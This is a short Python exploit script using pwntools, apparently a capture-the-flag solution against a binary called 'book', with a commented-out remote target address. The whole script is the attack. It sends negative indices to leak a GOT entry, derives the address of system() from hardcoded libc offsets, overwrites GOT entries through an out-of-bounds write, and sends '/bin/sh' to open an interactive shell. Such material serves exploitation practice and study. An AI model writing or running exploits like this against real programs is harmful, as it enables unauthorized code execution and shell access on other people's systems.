from pwn import *

p = process('./book')
# p = remote('34.159.182.195',32692)
e = ELF('./book')

def print_entry(idx):
	p.sendlineafter('>', b'2')
	p.sendlineafter('?', idx)

def store_entry(idx,note):
	p.sendlineafter('>', b'3')
	p.sendlineafter('?', idx)
	p.sendlineafter('?', note)

p.sendlineafter(':', b'aa')

store_entry(b'0', b'AAAA') # for debugging

print_entry(b'-4')
p.recvuntil(b'E: ')
leak = u64(p.recv(6).ljust(8, b'\x00'))
info('open_got: '+hex(leak))

# local
system = leak - 0xaae20
# remote
# system = leak -0xbba50

payload = b''
payload += p64(leak)
payload += p64(system)

store_entry(b'-4', payload )
p.sendlineafter('>',b'/bin/sh')

p.interactive()

